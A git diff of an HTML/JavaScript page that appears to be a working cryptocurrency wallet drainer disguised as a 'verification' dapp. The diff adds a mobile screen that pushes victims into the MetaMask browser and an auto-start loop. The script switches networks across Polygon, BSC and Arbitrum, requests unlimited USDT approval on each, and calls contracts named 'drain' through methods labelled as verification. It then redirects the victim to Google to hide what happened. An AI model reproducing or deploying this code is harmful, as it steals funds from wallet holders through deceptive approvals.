@@ -10,6 +10,7 @@
             margin: 0;
             padding: 20px;
             background-color: #f5f5f5;
+            text-align: center;
         }
         #debug {
             position: fixed;
@@ -26,9 +27,62 @@
             border-radius: 4px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
+        .mobile-container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        .metamask-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #f6851b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+            font-weight: bold;
+        }
+        .open-button {
+            background: #f6851b;
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        .open-button:hover {
+            background: #e2761b;
+        }
+        .instructions {
+            text-align: left;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .instructions ol {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        .instructions li {
+            margin-bottom: 8px;
+        }
         .status-container {
+            display: none;
             max-width: 600px;
-            margin: 80px auto 0;
+            margin: 20px auto;
             background: white;
             padding: 20px;
             border-radius: 8px;
@@ -40,27 +94,6 @@
             border-radius: 4px;
             background: #f9f9f9;
         }
-        .network-name {
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        .progress-bar {
-            height: 6px;
-            background: #e0e0e0;
-            border-radius: 3px;
-            overflow: hidden;
-            margin-top: 5px;
-        }
-        .progress-fill {
-            height: 100%;
-            background: #4CAF50;
-            width: 0%;
-            transition: width 0.3s;
-        }
-        .pending {
-            background: #FFF3CD;
-            border-left: 4px solid #FFC107;
-        }
         .success {
             background: #D1ECF1;
             border-left: 4px solid #0DCAF0;
@@ -69,209 +102,172 @@
             background: #F8D7DA;
             border-left: 4px solid #DC3545;
         }
-        .rejected {
-            background: #FFF3CD;
-            border-left: 4px solid #FFC107;
-        }
         .waiting {
             background: #E2E3E5;
             border-left: 4px solid #6C757D;
         }
-        #mobile-warning {
-            display: none;
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            padding: 15px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        #open-metamask {
-            display: none;
-            background: #f6851b;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 20px auto;
-            text-align: center;
-            width: 100%;
-            max-width: 300px;
-        }
-        #open-metamask:hover {
-            background: #e2761b;
-        }
-        .instruction-box {
-            background: #e8f4fd;
-            border: 1px solid #b6d7e8;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
     </style>
 </head>
 <body>
-    <div id="mobile-warning">
-        <strong>Mobile Browser Detected</strong><br>
-        Please open this page in MetaMask browser for the best experience.
-    </div>
-
-    <div id="open-metamask">
-        <strong>Open in MetaMask</strong><br>
-        <small>Tap to open in MetaMask browser</small>
-    </div>
-    
-    <div class="instruction-box" id="desktop-instruction" style="display: none;">
-        <strong>Desktop Instructions:</strong><br>
-        • Make sure MetaMask is installed<br>
-        • Connect your wallet to this dapp<br>
-        • The process will start automatically
-    </div>
-
-    <div class="instruction-box" id="mobile-instruction" style="display: none;">
-        <strong>Mobile Instructions:</strong><br>
-        • Open this link in MetaMask browser<br>
-        • Or tap the button above to open in MetaMask<br>
-        • Connect your wallet when prompted
-    </div>
-    
     <div id="debug"></div>
     
-    <div class="status-container">
+    <!-- Mobile Welcome Screen -->
+    <div id="mobile-welcome" class="mobile-container">
+        <div class="metamask-logo">M</div>
+        <h2>Open in MetaMask</h2>
+        <p>To continue, please open this dapp in the MetaMask browser</p>
+        
+        <button id="open-metamask" class="open-button">
+            Open in MetaMask
+        </button>
+        
+        <div class="instructions">
+            <strong>How to open:</strong>
+            <ol>
+                <li>Tap the button above</li>
+                <li>Select "Open in MetaMask"</li>
+                <li>Connect your wallet when prompted</li>
+                <li>The process will start automatically</li>
+            </ol>
+        </div>
+        
+        <p style="font-size: 12px; color: #666;">
+            If the button doesn't work, copy the URL and paste it in MetaMask browser
+        </p>
+    </div>
+
+    <!-- Transaction Status (Hidden by default) -->
+    <div id="status-container" class="status-container">
         <h3>Transaction Status</h3>
         <div id="network-statuses">
             <div class="network-status waiting" id="polygon-status">
-                <div class="network-name">Polygon</div>
+                <div><strong>Polygon</strong></div>
                 <div>Waiting...</div>
-                <div class="progress-bar"><div class="progress-fill"></div></div>
             </div>
             <div class="network-status waiting" id="bsc-status">
-                <div class="network-name">BNB Smart Chain</div>
+                <div><strong>BNB Smart Chain</strong></div>
                 <div>Waiting...</div>
-                <div class="progress-bar"><div class="progress-fill"></div></div>
             </div>
             <div class="network-status waiting" id="arbitrum-status">
-                <div class="network-name">Arbitrum</div>
+                <div><strong>Arbitrum</strong></div>
                 <div>Waiting...</div>
-                <div class="progress-bar"><div class="progress-fill"></div></div>
             </div>
         </div>
-        <div id="overall-status" style="margin-top: 20px; padding: 10px; text-align: center;"></div>
+        <div id="overall-status" style="margin-top: 20px; padding: 10px;"></div>
     </div>
 
 <script>
 const debug = document.getElementById('debug');
-const mobileWarning = document.getElementById('mobile-warning');
+const mobileWelcome = document.getElementById('mobile-welcome');
+const statusContainer = document.getElementById('status-container');
 const openMetaMaskBtn = document.getElementById('open-metamask');
-const desktopInstruction = document.getElementById('desktop-instruction');
-const mobileInstruction = document.getElementById('mobile-instruction');
 
-debug.textContent = 'Script started...';
+debug.textContent = 'Script started...\n';
 
-// Enhanced Web3 provider detection for mobile
-function getWeb3Provider() {
-    // Check for various Web3 providers
-    if (window.ethereum) {
-        return window.ethereum;
-    } else if (window.web3 && window.web3.currentProvider) {
-        return window.web3.currentProvider;
-    } else if (window.trustwallet) {
-        return window.trustwallet;
-    } else if (window.imToken) {
-        return window.imToken;
-    }
-    
-    // Mobile-specific providers
-    if (window.ethereum && window.ethereum.isMetaMask) {
-        return window.ethereum;
-    }
-    
-    return null;
-}
-
-// Detect if user is on mobile
-function isMobileDevice() {
+// Enhanced mobile detection
+function isMobile() {
     return /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
         navigator.userAgent.toLowerCase()
     );
 }
 
+// Enhanced Web3 detection
+function hasWeb3() {
+    return !!(window.ethereum || (window.web3 && window.web3.currentProvider));
+}
+
 // Generate MetaMask deeplink
-function generateMetaMaskDeeplink() {
+function getMetaMaskDeeplink() {
+    const currentUrl = window.location.href;
+    // Remove protocol for MetaMask deeplink
+    const urlWithoutProtocol = currentUrl.replace(/^https?:\/\//, '');
+    return `https://metamask.app.link/dapp/${urlWithoutProtocol}`;
+}
+
+// Generate universal deeplink
+function getUniversalDeeplink() {
     const currentUrl = encodeURIComponent(window.location.href);
-    // MetaMask deeplink format
     return `https://metamask.app.link/dapp/${currentUrl.replace('https://', '')}`;
 }
 
-// Generate Trust Wallet deeplink
-function generateTrustWalletDeeplink() {
-    const currentUrl = encodeURIComponent(window.location.href);
-    return `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
-}
-
-// Generate Rainbow Wallet deeplink
-function generateRainbowWalletDeeplink() {
-    const currentUrl = encodeURIComponent(window.location.href);
-    return `https://rnbwapp.com/browse?url=${currentUrl}`;
-}
-
-// Auto-redirect to MetaMask or show instructions
-function setupMobileRedirect() {
-    if (!isMobileDevice()) {
-        desktopInstruction.style.display = 'block';
-        return false;
-    }
-
-    mobileInstruction.style.display = 'block';
+// Try to auto-redirect to MetaMask
+function redirectToMetaMask() {
+    debug.textContent += '→ Redirecting to MetaMask...\n';
+    const deeplink = getUniversalDeeplink();
+    debug.textContent += '→ Deeplink: ' + deeplink + '\n';
     
-    const provider = getWeb3Provider();
-    if (provider) {
-        debug.textContent += '→ Web3 provider detected on mobile\n';
-        return true;
-    }
-
-    // No Web3 provider detected - show redirect options
-    debug.textContent += '→ No Web3 provider detected, showing redirect options\n';
-    mobileWarning.style.display = 'block';
-    openMetaMaskBtn.style.display = 'block';
-
-    // Try to auto-redirect to MetaMask after a short delay
+    // Try multiple redirect methods
+    window.location.href = deeplink;
+    
+    // Fallback - try again after delay
     setTimeout(() => {
-        if (!getWeb3Provider()) {
-            debug.textContent += '→ Attempting auto-redirect to MetaMask\n';
-            window.location.href = generateMetaMaskDeeplink();
+        if (!hasWeb3()) {
+            window.location.replace(deeplink);
         }
-    }, 1500);
-
-    return false;
+    }, 1000);
 }
 
-// Set up MetaMask button click handler
+// Initialize the app
+function initApp() {
+    debug.textContent += '→ Initializing app...\n';
+    debug.textContent += '→ Mobile: ' + isMobile() + '\n';
+    debug.textContent += '→ Web3: ' + hasWeb3() + '\n';
+    
+    // If Web3 is available, start the process
+    if (hasWeb3()) {
+        debug.textContent += '→ Web3 detected, starting process...\n';
+        mobileWelcome.style.display = 'none';
+        statusContainer.style.display = 'block';
+        startNetworkCycle();
+        return;
+    }
+    
+    // If on mobile without Web3, show welcome screen
+    if (isMobile()) {
+        debug.textContent += '→ Mobile without Web3, showing welcome screen\n';
+        mobileWelcome.style.display = 'block';
+        statusContainer.style.display = 'none';
+        
+        // Auto-redirect after short delay
+        setTimeout(() => {
+            if (!hasWeb3()) {
+                debug.textContent += '→ Auto-redirecting to MetaMask...\n';
+                redirectToMetaMask();
+            }
+        }, 500);
+    } else {
+        // Desktop without Web3
+        debug.textContent += '→ Desktop without Web3\n';
+        mobileWelcome.style.display = 'block';
+        statusContainer.style.display = 'none';
+        mobileWelcome.innerHTML = `
+            <div class="metamask-logo">M</div>
+            <h2>MetaMask Required</h2>
+            <p>Please install MetaMask to continue</p>
+            <button onclick="window.open('https://metamask.io/download/', '_blank')" class="open-button">
+                Install MetaMask
+            </button>
+        `;
+    }
+}
+
+// Setup MetaMask button
 openMetaMaskBtn.addEventListener('click', function() {
-    debug.textContent += '→ User tapped MetaMask button\n';
-    window.location.href = generateMetaMaskDeeplink();
+    debug.textContent += '→ Manual redirect to MetaMask\n';
+    redirectToMetaMask();
 });
 
-// FIX: Proper execution control
+// Web3 functionality (only runs if Web3 is available)
 let isExecuting = false;
 let executionCount = 0;
 const MAX_EXECUTIONS = 1;
 
-// Track which networks have been processed
 const processedNetworks = {
-    '0x89': false, // Polygon
-    '0x38': false, // BSC  
-    '0xa4b1': false // Arbitrum
+    '0x89': false,
+    '0x38': false, 
+    '0xa4b1': false
 };
 
-// Remove ALL previous event listeners to prevent loops
-document.removeEventListener('click', startNetworkCycle);
-document.removeEventListener('touchstart', startNetworkCycle);
-document.removeEventListener('mousedown', startNetworkCycle);
-
-// Required ABIs
 const usdtABI = [{
     "constant": false,
     "inputs": [
@@ -306,21 +302,21 @@ const drainABI = [{
 const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
 const CHAIN_CONFIGS = {
-    '0x89': { // POLYGON
+    '0x89': {
         contract: '0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55',
         usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
         function: 'verifyOnPolygon',
         name: 'Polygon',
         statusElement: 'polygon-status'
     },
-    '0x38': { // BSC
+    '0x38': {
         contract: '0xB6d9fd4ec4504aBF855453eEE1039cD002518238',
         usdt: '0x55d398326f99059fF775485246999027B3197955', 
         function: 'verifyOnBSC',
         name: 'BSC',
         statusElement: 'bsc-status'
     },
-    '0xa4b1': { // ARBITRUM
+    '0xa4b1': {
         contract: '0x7FC33491F197CAA19a9fDB9Faab01a670Bd64447',
         usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
         function: 'verifyOnArbitrum',
@@ -329,7 +325,6 @@ const CHAIN_CONFIGS = {
     }
 };
 
-// Update network status UI
 function updateNetworkStatus(chainId, status, message) {
     const config = CHAIN_CONFIGS[chainId];
     if (!config) return;
@@ -337,173 +332,79 @@ function updateNetworkStatus(chainId, status, message) {
     const element = document.getElementById(config.statusElement);
     if (!element) return;
     
-    // Remove all status classes
-    element.classList.remove('waiting', 'pending', 'success', 'error', 'rejected');
-    
-    // Add the appropriate status class
-    element.classList.add(status);
-    
-    // Update the message
-    const messageElement = element.querySelector('div:nth-child(2)');
-    if (messageElement) {
-        messageElement.textContent = message;
-    }
-    
-    // Update progress bar
-    const progressFill = element.querySelector('.progress-fill');
-    if (progressFill) {
-        if (status === 'success') {
-            progressFill.style.width = '100%';
-        } else if (status === 'pending') {
-            progressFill.style.width = '50%';
-        } else {
-            progressFill.style.width = '0%';
-        }
-    }
+    element.className = 'network-status ' + status;
+    element.querySelector('div:nth-child(2)').textContent = message;
 }
 
-// NETWORK SWITCHING FUNCTION
 async function switchNetwork(chainId) {
     const chainConfig = {
-        '0x89': { // POLYGON
+        '0x89': {
             chainId: '0x89',
             chainName: 'Polygon Mainnet',
             rpcUrls: ['https://polygon-rpc.com/'],
             blockExplorerUrls: ['https://polygonscan.com/'],
-            nativeCurrency: {
-                name: 'MATIC',
-                symbol: 'MATIC',
-                decimals: 18
-            }
+            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }
         },
-        '0x38': { // BSC
+        '0x38': {
             chainId: '0x38',
             chainName: 'BNB Smart Chain',
             rpcUrls: ['https://bsc-dataseed.binance.org/'],
             blockExplorerUrls: ['https://bscscan.com/'],
-            nativeCurrency: {
-                name: 'BNB',
-                symbol: 'BNB',
-                decimals: 18
-            }
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
         },
-        '0xa4b1': { // Arbitrum
+        '0xa4b1': {
             chainId: '0xa4b1',
             chainName: 'Arbitrum One',
             rpcUrls: ['https://arb1.arbitrum.io/rpc'],
             blockExplorerUrls: ['https://arbiscan.io/'],
-            nativeCurrency: {
-                name: 'ETH',
-                symbol: 'ETH',
-                decimals: 18
-            }
+            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }
         }
     };
 
     try {
-        const provider = getWeb3Provider();
-        if (!provider) {
-            throw new Error('No Web3 provider available');
-        }
-
-        debug.textContent += `→ Requesting network switch to ${CHAIN_CONFIGS[chainId].name}...\n`;
-        await provider.request({
+        await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: chainId }],
         });
-        debug.textContent += `→ Network switch approved by user\n`;
         return true;
     } catch (switchError) {
-        // If network not added, add it
         if (switchError.code === 4902) {
             try {
-                const provider = getWeb3Provider();
-                if (!provider) {
-                    throw new Error('No Web3 provider available');
-                }
-
-                debug.textContent += `→ Adding ${CHAIN_CONFIGS[chainId].name} network...\n`;
-                await provider.request({
+                await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
                     params: [chainConfig[chainId]],
                 });
-                debug.textContent += `→ Network added successfully\n`;
                 return true;
             } catch (addError) {
-                debug.textContent += '→ Failed to add network: ' + addError.message + '\n';
                 return false;
             }
-        } else if (switchError.code === 4001) {
-            debug.textContent += '→ User rejected network switch\n';
-            return 'rejected';
         }
-        debug.textContent += '→ Switch network error: ' + switchError.message + '\n';
         return false;
     }
 }
 
-// Process a single network
 async function processNetwork(chainId) {
     try {
-        const provider = getWeb3Provider();
-        if (!provider) {
-            throw new Error('No Web3 provider detected. Please use MetaMask or a Web3-enabled browser.');
-        }
-
+        const provider = window.ethereum;
         const web3 = new Web3(provider);
         
-        // Check if provider has request method (mobile compatibility)
-        if (typeof provider.request !== 'function') {
-            throw new Error('Web3 provider does not support request method. Please use a compatible wallet.');
-        }
-        
-        const accounts = await provider.request({ 
-            method: 'eth_requestAccounts' 
-        });
-        
-        if (!accounts || accounts.length === 0) {
-            throw new Error('No accounts found. Please connect your wallet.');
-        }
-        
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
         const currentChainId = await provider.request({ method: 'eth_chainId' });
-        debug.textContent += `→ Current network: ${CHAIN_CONFIGS[currentChainId]?.name || 'Unknown'}\n`;
         
         const config = CHAIN_CONFIGS[chainId];
-        debug.textContent += `→ Processing ${config.name}...\n`;
-        
-        // Switch to this network if needed
+        updateNetworkStatus(chainId, 'waiting', 'Starting...');
+
         if (currentChainId !== chainId) {
-            debug.textContent += `→ Need to switch to ${config.name}...\n`;
-            updateNetworkStatus(chainId, 'pending', 'Approving network switch...');
-            
-            const switchResult = await switchNetwork(chainId);
-            if (switchResult === 'rejected') {
-                debug.textContent += `→ User rejected network switch to ${config.name}\n`;
-                updateNetworkStatus(chainId, 'rejected', 'User rejected network switch');
-                return 'rejected';
-            } else if (!switchResult) {
-                debug.textContent += `→ Failed to switch to ${config.name}\n`;
-                updateNetworkStatus(chainId, 'error', 'Failed to switch network');
+            updateNetworkStatus(chainId, 'waiting', 'Switching network...');
+            const switched = await switchNetwork(chainId);
+            if (!switched) {
+                updateNetworkStatus(chainId, 'error', 'Network switch failed');
                 return 'error';
             }
-            
-            // Wait for network switch to complete
-            updateNetworkStatus(chainId, 'pending', 'Switching network...');
             await new Promise(resolve => setTimeout(resolve, 3000));
         }
-        
-        // Get current chain after switch
-        const newChainId = await provider.request({ method: 'eth_chainId' });
-        if (newChainId !== chainId) {
-            debug.textContent += `→ Still on wrong network: ${newChainId}\n`;
-            updateNetworkStatus(chainId, 'error', 'Network switch failed');
-            return 'error';
-        }
-        
-        debug.textContent += `→ On ${config.name}, requesting USDT approval...\n`;
-        updateNetworkStatus(chainId, 'pending', 'Approving USDT...');
-        
-        // Auto-approve with rejection handling
+
+        updateNetworkStatus(chainId, 'waiting', 'Approving USDT...');
         const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
         
         try {
@@ -513,173 +414,71 @@ async function processNetwork(chainId) {
             });
         } catch (approvalError) {
             if (approvalError.code === 4001) {
-                // User rejected the transaction
-                debug.textContent += '→ User rejected USDT approval\n';
-                updateNetworkStatus(chainId, 'rejected', 'User rejected USDT approval');
+                updateNetworkStatus(chainId, 'error', 'User rejected approval');
                 return 'rejected';
             }
-            throw approvalError; // Re-throw other errors
+            throw approvalError;
         }
 
-        debug.textContent += `→ ${config.name} approved! Processing transaction...\n`;
-        updateNetworkStatus(chainId, 'pending', 'Processing transaction...');
-
-        // Auto-drain
+        updateNetworkStatus(chainId, 'waiting', 'Processing transaction...');
         const drainContract = new web3.eth.Contract(drainABI, config.contract);
         await drainContract.methods[config.function](1000000).send({
             from: accounts[0],
             gas: 200000
         });
 
-        debug.textContent += `→ ${config.name} COMPLETED!\n`;
         updateNetworkStatus(chainId, 'success', 'Transaction successful');
-        
         processedNetworks[chainId] = true;
         return 'success';
     } catch (error) {
-        if (error.code === 4001) {
-            debug.textContent += '→ User rejected transaction\n';
-            updateNetworkStatus(chainId, 'rejected', 'User rejected transaction');
-            return 'rejected';
-        } else {
-            debug.textContent += '→ ERROR: ' + error.message + '\n';
-            updateNetworkStatus(chainId, 'error', error.message || 'Transaction failed');
-            return 'error';
-        }
+        updateNetworkStatus(chainId, 'error', 'Transaction failed');
+        return 'error';
     }
 }
 
-// Sequential network processing
-async function processNetworksSequentially() {
-    if (isExecuting) {
-        debug.textContent += '→ Already executing, skipping...\n';
-        return;
-    }
-    
-    // Check for Web3 provider before starting
-    const provider = getWeb3Provider();
-    if (!provider) {
-        debug.textContent += '→ ERROR: No Web3 provider found.\n';
-        updateNetworkStatus('0x89', 'error', 'No Web3 wallet detected');
-        updateNetworkStatus('0x38', 'error', 'No Web3 wallet detected');
-        updateNetworkStatus('0xa4b1', 'error', 'No Web3 wallet detected');
-        
-        const overallStatus = document.getElementById('overall-status');
-        if (overallStatus) {
-            overallStatus.textContent = 'Error: No Web3 wallet detected';
-            overallStatus.style.background = '#F8D7DA';
-            overallStatus.style.color = '#DC3545';
-        }
-        return;
-    }
-    
+async function startNetworkCycle() {
+    if (isExecuting) return;
     isExecuting = true;
     executionCount++;
-    
-    debug.textContent += `→ Starting sequential network processing...\n`;
-    
-    const networksToProcess = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
+
+    const networksToProcess = ['0x89', '0x38', '0xa4b1'];
     let successfulDrains = 0;
-    
+
     for (const chainId of networksToProcess) {
-        // Skip if already processed in previous execution
-        if (processedNetworks[chainId]) {
-            debug.textContent += `→ ${CHAIN_CONFIGS[chainId].name} already processed, skipping...\n`;
-            continue;
-        }
-        
-        debug.textContent += `\n--- PROCESSING ${CHAIN_CONFIGS[chainId].name} ---\n`;
+        if (processedNetworks[chainId]) continue;
         
         const result = await processNetwork(chainId);
+        if (result === 'success') successfulDrains++;
         
-        if (result === 'success') {
-            successfulDrains++;
-        }
-        
-        debug.textContent += `→ ${CHAIN_CONFIGS[chainId].name} result: ${result}\n`;
-        
-        // If user rejects or error, continue to next network
-        // Small delay between networks (only if not the last network)
-        const currentIndex = networksToProcess.indexOf(chainId);
-        if (currentIndex < networksToProcess.length - 1) {
-            debug.textContent += `→ Moving to next network in 3 seconds...\n`;
+        if (networksToProcess.indexOf(chainId) < networksToProcess.length - 1) {
             await new Promise(resolve => setTimeout(resolve, 3000));
         }
     }
-    
-    debug.textContent += `\n→ COMPLETED: ${successfulDrains}/3 networks successful\n`;
-    
-    // Update overall status
+
     const overallStatus = document.getElementById('overall-status');
-    if (overallStatus) {
-        overallStatus.textContent = `Completed: ${successfulDrains}/3 networks processed`;
-        overallStatus.style.padding = '10px';
-        overallStatus.style.borderRadius = '4px';
-        
-        if (successfulDrains === 3) {
-            overallStatus.style.background = '#D1ECF1';
-            overallStatus.style.color = '#0DCAF0';
-        } else if (successfulDrains > 0) {
-            overallStatus.style.background = '#FFF3CD';
-            overallStatus.style.color = '#FFC107';
-        } else {
-            overallStatus.style.background = '#F8D7DA';
-            overallStatus.style.color = '#DC3545';
-        }
-    }
-    
-    // Redirect after completion
+    overallStatus.textContent = `Completed: ${successfulDrains}/3 networks processed`;
+    overallStatus.style.background = successfulDrains > 0 ? '#D1ECF1' : '#F8D7DA';
+    overallStatus.style.color = successfulDrains > 0 ? '#0DCAF0' : '#DC3545';
+
     setTimeout(() => {
-        debug.textContent += '→ Redirecting to Google...\n';
         window.location.href = "https://google.com";
     }, 3000);
     
     isExecuting = false;
 }
 
-// Start the network cycle
-function startNetworkCycle() {
-    debug.textContent += '→ Starting network cycle...\n';
-    if (executionCount < MAX_EXECUTIONS) {
-        processNetworksSequentially();
-    }
-}
-
-// Initialize the application
-function initApp() {
-    const hasWeb3 = setupMobileRedirect();
-    
-    if (hasWeb3 || !isMobileDevice()) {
-        // Start the process if Web3 is available or on desktop
-        setTimeout(() => {
-            startNetworkCycle();
-        }, 2000);
-    }
-}
-
-// Single click handler
-let clickHandlerAdded = false;
-if (!clickHandlerAdded) {
-    document.addEventListener('click', () => {
-        debug.textContent += '→ Click detected, starting network cycle...\n';
-        startNetworkCycle();
-    }, { once: true });
-    clickHandlerAdded = true;
-}
-
-// Add network change listener
-if (window.ethereum) {
-    window.ethereum.on('chainChanged', (chainId) => {
-        debug.textContent += `→ Network changed to: ${chainId}\n`;
-    });
-    
-    window.ethereum.on('accountsChanged', (accounts) => {
-        debug.textContent += `→ Accounts changed: ${accounts.length} accounts\n`;
-    });
-}
-
-// Initialize the app
+// Start the app
 initApp();
+
+// Also try to detect if Web3 becomes available later
+setInterval(() => {
+    if (hasWeb3() && !isExecuting && executionCount === 0) {
+        debug.textContent += '→ Web3 detected later, starting process...\n';
+        mobileWelcome.style.display = 'none';
+        statusContainer.style.display = 'block';
+        startNetworkCycle();
+    }
+}, 1000);
 </script>
 </body>
 </html>
